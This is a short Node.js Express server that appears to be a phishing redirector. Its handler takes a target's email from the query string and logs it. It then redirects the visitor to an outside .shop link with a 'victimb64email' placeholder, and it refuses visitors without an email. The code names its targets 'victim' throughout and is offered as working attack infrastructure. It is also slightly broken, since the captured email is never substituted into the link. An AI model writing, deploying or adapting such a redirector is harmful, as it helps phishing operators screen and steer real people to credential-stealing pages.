let express = require("express"),
    bodyParser = require('body-parser'),
    app = express(),
    links = ["https://nhiyrankoaaafi.shop/?fgcxxqjq"];


app.set("port", (process.env.PORT || 8080));

app.use(bodyParser.json())

app.get("/",(req,res)=> {

    console.log(req.query.email);
    
    if (req.query.email !== undefined) {

        let link = links[Math.floor(Math.random() * links.length)],
            victimEmail = req.query.email;

    res.redirect(`${link}&qrc=##victimb64email##`);

    } else {

        res.sendStatus(403);

    }

})

app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});


app.listen(app.get("port"), () => {

        console.log(`Listening on port ${app.get("port")}`);

});